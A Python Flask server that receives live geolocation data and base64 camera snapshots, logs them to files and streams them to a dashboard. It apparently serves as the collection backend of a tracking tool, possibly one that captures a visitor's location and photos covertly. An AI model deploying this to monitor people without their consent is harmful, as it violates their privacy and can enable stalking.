from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO
from datetime import datetime
import base64
import os

app = Flask(__name__, static_folder="../frontend")
socketio = SocketIO(app, cors_allowed_origins="*")


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "dashboard.html")


# =========================
# 📍 LOCATION ENDPOINT
# =========================
@app.route("/location", methods=["POST"])
def location():
    data = request.json

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy")
    speed = data.get("speed", 0)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    socketio.emit("update_location", {
        "lat": lat,
        "lon": lon,
        "accuracy": acc,
        "speed": speed,
        "time": time
    })

    output = f"""
📍 LIVE LOCATION
Time     : {time}
Latitude : {lat}
Longitude: {lon}
Accuracy : {acc} meters
Speed    : {speed} m/s
-------------------------
"""
    print(output)

    with open("locations.log", "a") as f:
        f.write(output)

    return jsonify({"status": "success"})


# =========================
# 📷 CAPTURE IMAGE ENDPOINT
# =========================
@app.route("/capture", methods=["POST"])
def capture():
    data = request.json.get("image")

    if not data:
        return jsonify({"error": "No image received"}), 400

    # Remove base64 header (data:image/jpeg;base64,...)
    image_data = data.split(",")[1]
    image_bytes = base64.b64decode(image_data)

    os.makedirs("captures", exist_ok=True)

    filename = datetime.now().strftime("capture_%Y%m%d_%H%M%S.jpg")
    filepath = os.path.join("captures", filename)

    with open(filepath, "wb") as f:
        f.write(image_bytes)

    print(f"📷 PHOTO CAPTURED: {filepath}")

    # Optional: notify dashboard
    socketio.emit("photo_captured", {
        "file": filename,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

    return jsonify({"status": "photo_saved"})


# =========================
# 🚀 RUN SERVER
# =========================
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000)
